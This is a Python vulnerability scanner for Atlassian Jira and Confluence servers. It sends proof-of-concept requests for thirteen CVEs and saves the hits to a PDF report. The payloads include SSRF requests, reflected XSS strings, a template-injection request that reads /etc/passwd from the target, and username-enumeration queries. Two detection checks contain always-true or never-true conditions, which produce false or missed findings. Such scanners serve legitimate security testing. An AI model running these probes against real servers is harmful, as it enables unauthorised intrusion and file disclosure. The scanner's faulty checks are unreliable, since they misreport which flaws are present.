import requests
import sys
import random
import json
import pdfkit
import os

try:
    baseUrl = sys.argv[1]
except:
    print(f"Usage: python3 {sys.argv[0]} https://jira.target.com")
    sys.exit(1)

def clean_url(baseUrl):
    while baseUrl.endswith("/"):
        baseUrl=baseUrl[0:-1]
    return baseUrl

baseUrl = clean_url(baseUrl)

vulnerabilities = [
    {
        "id":"CVE-2017-9506",
        "desc":"The IconUriServlet of the Atlassian OAuth Plugin from version 1.3.0 before version 1.9.12 and from version 2.0.0 before version 2.0.4 allows remote attackers to access the content of internal network resources and/or perform an XSS attack via Server Side Request Forgery (SSRF). When running in an environment like Amazon EC2, this flaw can used to access to a metadata resource that provides access credentials and other potentially confidential information.",
        "severity":"high",
        "endpoint":"/plugins/servlet/oauth/users/icon-uri?consumerUri=https://ipinfo.io/json"
    },
    {
        "id":"CVE-2018-20824",
        "desc":"The WallboardServlet resource in Jira before version 7.13.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross site scripting (XSS) vulnerability in the cyclePeriod parameter.",
        "severity":"medium",
        "endpoint":"/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)"
    },
    {
        "id":"CVE-2019-8451",
        "desc":"The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class.",
        "severity":"high",
        "endpoint":f"/plugins/servlet/gadgets/makeRequest?url={baseUrl}@ipinfo.io/json"
    },
    {
        "id":"CVE-2019-8449",
        "desc":"The /rest/api/latest/groupuserpicker resource in Jira before version 8.4.0 allows remote attackers to enumerate usernames via an information disclosure vulnerability.",
        "severity":"low",
        "endpoint":"/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"
    },
    {
        "id":"CVE-2019-8442",
        "desc":"The CachingResourceDownloadRewriteRule class in Jira before version 7.13.4, and from version 8.0.0 before version 8.0.4, and from version 8.1.0 before version 8.1.1 allows remote attackers to access files in the Jira webroot under the META-INF directory via a lax path access check.",
        "severity":"low",
        "endpoint":"/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
    },
    {
        "id":"CVE-2019-3403",
        "desc":"The /rest/api/2/user/picker rest resource in Jira before version 7.13.3, from version 8.0.0 before version 8.0.4, and from version 8.1.0 before version 8.1.1 allows remote attackers to enumerate usernames via an incorrect authorisation check.",
        "severity":"low",
        "endpoint":"/rest/api/2/user/picker?query=admin"
    },
    {
        "id":"CVE-2019-3402",
        "desc":"The ConfigurePortalPages.jspa resource in Jira before version 7.13.3 and from version 8.0.0 before version 8.1.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross site scripting (XSS) vulnerability in the searchOwnerUserName parameter.",
        "severity":"medium",
        "endpoint":"/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search"
    },
    {
        "id":"CVE-2019-3396",
        "desc":"The Widget Connector macro in Atlassian Confluence Server before version 6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code execution on a Confluence Server or Data Center instance via server-side template injection.",
        "severity":"critical",
        "endpoint":"/rest/tinymce/1/macro/preview"
    },
    {
        "id":"CVE-2019-11581",
        "desc":"There was a server-side template injection vulnerability in Jira Server and Data Center, in the ContactAdministrators and the SendBulkMail actions. An attacker is able to remotely execute code on systems that run a vulnerable version of Jira Server or Data Center. All versions of Jira Server and Data Center from 4.4.0 before 7.6.14, from 7.7.0 before 7.13.5, from 8.0.0 before 8.0.3, from 8.1.0 before 8.1.2, and from 8.2.0 before 8.2.3 are affected by this vulnerability.",
        "severity":"critical",
        "endpoint":"/secure/ContactAdministrators!default.jspa"
    },
    {
        "id":"CVE-2020-14179",
        "desc":"Affected versions of Atlassian Jira Server and Data Center allow remote, unauthenticated attackers to view custom field names and custom SLA names via an Information Disclosure vulnerability in the /secure/QueryComponent!Default.jspa endpoint. The affected versions are before version 8.5.8, and from version 8.6.0 before 8.11.1.",
        "severity":"low",
        "endpoint":"/secure/QueryComponent!Default.jspa"
    },
    {
        "id":"CVE-2020-14178",
        "desc":"Affected versions of Atlassian Jira Server and Data Center allow remote attackers to enumerate project keys via an Information Disclosure vulnerability in the /browse.PROJECTKEY endpoint. The affected versions are before version 7.13.7, from version 8.0.0 before 8.5.8, and from version 8.6.0 before 8.12.0.",
        "severity":"low",
        "endpoint":f"/browse.{random.randint(100,1000000)}"
    },
    {
        "id":"CVE-2020-14181",
        "desc":"Affected versions of Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint. The affected versions are before version 7.13.6, from version 8.0.0 before 8.5.7, and from version 8.6.0 before 8.12.0.",
        "severity":"low",
        "endpoint":"/secure/ViewUserHover.jspa?username=Admin"
    },
    {
        "id":"CVE-2020-36289",
        "desc":"Affected versions of Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the QueryComponentRendererValue!Default.jspa endpoint. The affected versions are before version 8.5.13, from version 8.6.0 before 8.13.5, and from version 8.14.0 before 8.15.1.",
        "severity":"low",
        "endpoint":"/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin"
    }
]

def checkUrl(baseUrl):
    try:
        r = requests.get(baseUrl)
        return True
    except:
        return False

def findVersion(baseUrl):
    r=requests.get(f"{baseUrl}/rest/api/latest/serverInfo",allow_redirects=False)
    try:
        server_data=json.loads(str(r.content,'utf-8'))
        print('\n')
        print("\t-------- Server Information -----------")
        print("\n")
        print("[*] URL --> ",server_data.get("baseUrl"))
        print("[*] Server Title --> ",server_data.get("serverTitle"))
        print("[*] Version --> " ,server_data.get("version"))
        print("[*] Deployment Type --> ",server_data.get("deploymentType"))
        print("[*] Build Number --> ",server_data.get("buildNumber"))
        print("[*] Build Date --> ",server_data.get("buildDate"))
        print()
    
    except Exception as e:
        print(f"An Unexpected Error Occured: {e}")

found = []

def checkVuln(id):
    if id == "CVE-2017-9506":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if r.status_code==200 and "missingauth" in str(r.content):
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)            

    if id == "CVE-2018-20824":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        severity = next((vuln["severity"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if "alert(document.domain)" in str(r.content):
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)

    if id == "CVE-2019-8451":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if r.status_code==200 and "missingauth" in str(r.content):
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)

    if id == "CVE-2019-8449":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if "You are not authenticated. Authentication required to perform this operation." not in str(r.content):
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)

    if id == "CVE-2019-8442":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if r.status_code == 200:
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)

    if id == "CVE-2019-3403":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if "The user named '{0}' does not exist" or "errorMessages" not in str(r.content):
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)

    if id == "CVE-2019-3402":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if "alert(1)" in str(r.content):
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)    

    if id == "CVE-2019-3396":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.post(f"{baseUrl}{endpoint}", json={"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}})
        if "root" in str(r.content):
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)

    if id == "CVE-2019-11581":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if "Your Jira administrator" or "Contact Site Administrators"  in str(r.content):
            pass
        else:
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)

    if id == "CVE-2020-14179":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if r.status_code == 200:
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)    

    if id == "CVE-2020-14178":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if "Project Does Not Exist" in str(r.content):
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)

    if id == "CVE-2020-14181":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if r.status_code !=200 or "Your session has timed out" in str(r.content):
            pass
        else:
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)

    if id == "CVE-2020-36289":
        endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == id), None)
        r = requests.get(f"{baseUrl}{endpoint}")
        if "Assignee" in str(r.content):
            print(f"[{id}] {baseUrl}{endpoint}")
            found.append(id)

findVersion(baseUrl)

if __name__ == '__main__':
    report = ""
    for vuln in vulnerabilities:
        try:
            checkVuln(vuln["id"])
        except:
            pass
    if len(found):
        for v in found:
            description = next((vuln["desc"] for vuln in vulnerabilities if vuln["id"] == v), None)
            severity = next((vuln["severity"] for vuln in vulnerabilities if vuln["id"] == v), None)
            endpoint = next((vuln["endpoint"] for vuln in vulnerabilities if vuln["id"] == v), None)
            report = report + f"<b>Vulnerability ID</b>: {v} <br><b>Description</b>: {description} <br><b>Severity</b>: {severity}<br><b>URL</b>: {baseUrl}{endpoint}<br><br>"
        name = f"temp_{random.randint(100,1000)}.html"
        with open(name, 'w') as file:
            file.write(f'<p style="font-family:\'Courier New\'">{report}</p>')
        pdfkit.from_file(name,f"output/{baseUrl.replace('http://','').replace('https://','')}.pdf")
        os.remove(name)
        print(f"\nReport Saved to: output/{baseUrl.replace('http://','').replace('https://','')}.pdf")
    else:
        print("No vulnerabilities found.")